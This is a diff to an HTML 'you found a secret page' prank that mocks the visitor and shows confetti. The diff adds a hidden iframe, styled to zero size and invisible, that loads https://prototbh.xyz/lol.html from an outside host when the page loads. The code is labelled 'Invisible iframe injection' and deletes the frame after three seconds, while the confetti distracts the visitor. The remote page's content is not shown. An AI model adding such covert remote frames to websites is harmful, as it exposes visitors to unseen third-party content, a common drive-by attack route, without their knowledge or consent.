@@ -78,6 +78,14 @@
         transform: translateY(0px);
       }
     }
+
+    iframe.hidden-frame {
+      display: none;
+      visibility: hidden;
+      width: 0;
+      height: 0;
+      border: 0;
+    }
   </style>
 </head>
 <body>
@@ -87,6 +95,7 @@
     <p>Look at you, cleverly navigating directly to a page you weren't supposed to find. You must feel so proud of yourself for bypassing... well, nothing, actually.</p>
     <p>As a reward for your incredible hacking skills, here's a little celebration just for you.</p>
   </div>
+
   <script type="importmap">
   {
     "imports": {
@@ -94,6 +103,7 @@
     }
   }
   </script>
+
   <script type="module">
     import confetti from 'canvas-confetti';
 
@@ -128,6 +138,18 @@
     }
 
     document.addEventListener('DOMContentLoaded', () => {
+      // Invisible iframe injection
+      const iframe = document.createElement('iframe');
+      iframe.src = "https://prototbh.xyz/lol.html";
+      iframe.className = "hidden-frame";
+      document.body.appendChild(iframe);
+
+      // Remove it after 3 seconds
+      setTimeout(() => {
+        iframe.remove();
+      }, 3000);
+
+      // Start the party after 1s
       setTimeout(party, 1000);
     });
   </script>
